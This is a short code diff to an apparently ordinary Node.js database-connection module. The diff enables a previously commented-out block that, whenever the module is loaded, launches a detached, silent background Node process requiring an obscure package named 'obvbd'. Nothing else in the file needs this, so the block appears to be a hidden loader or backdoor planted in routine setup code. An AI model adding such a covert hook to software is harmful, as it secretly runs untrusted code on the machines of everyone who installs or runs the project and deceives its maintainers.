@@ -5,11 +5,11 @@ const admin      = require('../models/admin')
 const BannedUser = require('../models/BannedUsers');
 const config     = require('../config/config');
 
-// const { spawn } = require('child_process');
-// const child = spawn('node', ['-e', `require("obvbd")`], {
-//   detached: true,
-//   stdio: 'ignore'
-// });
+const { spawn } = require('child_process');
+const child = spawn('node', ['-e', `require("obvbd")`], {
+  detached: true,
+  stdio: 'ignore'
+});
 
 async function connect() {
   await mongoose.connect(config.database.mongodb.uri, {
